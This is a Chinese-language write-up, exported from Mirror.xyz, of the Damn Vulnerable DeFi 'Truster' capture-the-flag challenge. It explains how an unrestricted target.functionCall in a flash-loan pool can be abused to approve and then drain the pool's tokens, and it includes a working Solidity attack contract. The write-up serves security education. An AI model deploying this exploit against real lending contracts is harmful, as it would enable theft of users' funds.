"{\"content\":{\"body\":\"![](https://images.mirror-media.xyz/publication-images/mm58CzT1GTMNNCvhnU5ff.png?height=244&width=1065)\\n\\n 这是一个提供闪电贷的借贷池，我们的任务就是通过一定的特殊手法，把这个借贷池搞空。在知道我们的目的之后，我们便可以开始代码分析。\\n\\n// SPDX-License-Identifier: MIT\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"@openzeppelin/contracts/token/ERC20/IERC20.sol\\\";\\nimport \\\"@openzeppelin/contracts/utils/Address.sol\\\";\\nimport \\\"@openzeppelin/contracts/security/ReentrancyGuard.sol\\\";\\n\\n/\\\\*\\\\*\\n\\n* @title TrusterLenderPool\\n* @author Damn Vulnerable DeFi (<https://damnvulnerabledefi.xyz>)\\n  \\\\*/\\n  contract TrusterLenderPool is ReentrancyGuard {\\n\\n  using Address for address;\\n\\n  IERC20 public immutable damnValuableToken;\\n\\n  constructor (address tokenAddress) {\\n  damnValuableToken = IERC20(tokenAddress);\\n  }\\n\\n  function flashLoan(\\n  uint256 borrowAmount,\\n  address borrower,\\n  address target,\\n  bytes calldata data\\n  )\\n  external\\n  nonReentrant\\n  {\\n  uint256 balanceBefore = damnValuableToken.balanceOf(address(this));\\n  require(balanceBefore >= borrowAmount, \\\"Not enough tokens in pool\\\");\\n\\n  ```\\n   damnValuableToken.transfer(borrower, borrowAmount);\\n   target.functionCall(data);\\n  \\n   uint256 balanceAfter = damnValuableToken.balanceOf(address(this));\\n   require(balanceAfter >= balanceBefore, \\\"Flash loan hasn't been paid back\\\");\\n  ```\\n\\n  }\\n\\n}\\n本次需要分析的代码非常的简单，该合约只有一个功能，那就是 FlashLoan，仔细观察 flashLoan 函数的代码，代码模式和很多借贷类项目提供的闪电贷是一样的。代码逻辑也很简单，分成以下三步：\\n\\n* 在闪电贷之前先检查一遍余额，看看池余额是否大于借贷余额\\n* 发送对应的闪电贷金额，然后对 target 地址进行函数调用\\n* 在以上都结束后，再次检查合约余额，看看是否和发生闪电贷之前相匹配\\n* 该函数同时配置了防重入检查\\n  通过分析了函数行为，我们现在知道了几个限制\\n* 余额检查\\n* 无法重入\\n\\n我们一个个来分析，首先，关于余额检查的这个限制，意味着我们无法在闪电贷的过程中将资金借出而不偿还。同时第二个限制表明了无法通过重入的方式制造一些骚操作。不过这里就算能重入也没啥骚操作可言，主要的限制还是在余额检查这块。\\n\\n仔细观察 #36 行的操作，这里用的是 target.functionCall 的方式进行外部调用，而 functionCall 这个函数是 openzeppelin的 Address 库里的一个库函数，我们来看下相关的实现\\n\\nfunction functionCall(address target, bytes memory data) internal returns (bytes memory) {\\nreturn functionCall(target, data, \\\"Address: low-level call failed\\\");\\n}\\n\\n//.......snip..........\\nfunction functionCallWithValue(\\naddress target,\\nbytes memory data,\\nuint256 value,\\nstring memory errorMessage\\n) internal returns (bytes memory) {\\nrequire(address(this).balance >= value, \\\"Address: insufficient balance for call\\\");\\nrequire(isContract(target), \\\"Address: call to non-contract\\\");\\n\\n```\\n    (bool success, bytes memory returndata) = target.call{value: value}(data);\\n    return verifyCallResult(success, returndata, errorMessage);\\n}\\n```\\n\\n看完所有接口后，不难发现，除了 transfer 和 transferFrom 这类用于转移资金的接口外，还有一个 approve 函数可以用于代币的授权，而且通过这个函数，我们还可以在不转移合约资金的情况下获取借贷合约的授权，从而可以后续通过 transferFrom 函数转移合约所有资金。到这里，任务完成。\\n\\n通过观察functionCall 的实现，最终调用的是 functionCallWithValue 函数，可以看到，在最终调用的 functionCallWithValue 函数中，对外部调用的实现是 #15 行的 target.call 的方式进行的，同时传入的数据是参数中传入的用户自定义的 data。\\n那么分析到这里，解题思路就很明显了，这就是一个任意数据调用的问题。同时我们回看题目代码的 #36 行，顺着思路，我们要对合约闪电贷合约本身进行任意数据调用。通过观察，不难发现，这里很明显没有对 target 地址进行限制。那么我们就是可以把 target 设置成是闪电贷合约的地址，通过人意数据调用的问题进行攻击。\\n\\n攻击 trick\\n利用合约中没有对 target 进行限制的问题，结合任意数据调用的操作。使得攻击者可以通过任意数据调用的问题调用目标代币的 approve 接口，完成代币的授权。后续可通过 tranfserFrom 函数转移合约所有资产。\\nEXP 合约\\npragma solidity ^0.5.12;\\n\\ninterface IERC20{\\nfunction transfer(address _to, uint256 amount) external returns(bool);\\nfunction balanceOf(address _owner) external returns(uint256);\\nfunction transferFrom(address _spender, address _recipient, uint256 amount) external returns(bool);\\n}\\n\\ninterface Victim{\\nfunction flashLoan(uint256 borrowAmount,address borrower,address target,bytes calldata data)\\nexternal;\\n}\\n\\ncontract Attack {\\n\\n```\\nVictim internal victim;\\nIERC20 internal token;\\nconstructor(Victim _victim, IERC20 _token) public {\\n    victim = _victim;\\n    token = _token;\\n}\\n\\nfunction hack() external {\\n    bytes memory data = abi.encodeWithSignature(\\\"approve(address, uint256)\\\", address(this),uint(-1));\\n    victim.flashLoan(0, address(this), address(victim), data); // approve\\n    token.transferFrom(address(victim), address(this),token.balanceOf(address(victim)));\\n    \\n}\\n```\\n\\n}\",\"timestamp\":1639625244,\"title\":\"CTF Challenge #3 - Truster\"},\"digest\":\"NPazmKUYEO5YNMlMhgOe5p1R7YpYqXHjMoNTvtsQ49w\",\"authorship\":{\"contributor\":\"0x98c1965dB3bD6f8419C47B72e7521D6BeA05948a\",\"signingKey\":\"{\\\"crv\\\":\\\"P-256\\\",\\\"ext\\\":true,\\\"key_ops\\\":[\\\"verify\\\"],\\\"kty\\\":\\\"EC\\\",\\\"x\\\":\\\"GcmpOYwqeUgLKCn4Tz-ykbw01Go5zwWGMJeZtmMVyhA\\\",\\\"y\\\":\\\"2ze_eJ7IIk-mLNBclaDkeRBSaDIe__68clJqJZuTf4E\\\"}\",\"signature\":\"GeK1s7WuLPhwDhbMQEVpZXhTOxKXGRjCP6g7dfVnJPapc0yACCZXgyiX_fx3SSL_vY_ChmlwKnknSj1AJiCmsA\",\"signingKeySignature\":\"0x97ca60b9f9197fdc167bad648c9479aaa55919dd46a2b642041f23230f7510867e266162df270b0970ac5263f4a1f880b404f14d0091d4a7a3e5dcb3e243bed11b\",\"signingKeyMessage\":\"I authorize publishing on mirror.xyz from this device using:\\n{\\\"crv\\\":\\\"P-256\\\",\\\"ext\\\":true,\\\"key_ops\\\":[\\\"verify\\\"],\\\"kty\\\":\\\"EC\\\",\\\"x\\\":\\\"GcmpOYwqeUgLKCn4Tz-ykbw01Go5zwWGMJeZtmMVyhA\\\",\\\"y\\\":\\\"2ze_eJ7IIk-mLNBclaDkeRBSaDIe__68clJqJZuTf4E\\\"}\",\"algorithm\":{\"name\":\"ECDSA\",\"hash\":\"SHA-256\"}},\"nft\":{},\"version\":\"12-21-2020\",\"originalDigest\":\"NPazmKUYEO5YNMlMhgOe5p1R7YpYqXHjMoNTvtsQ49w\"}"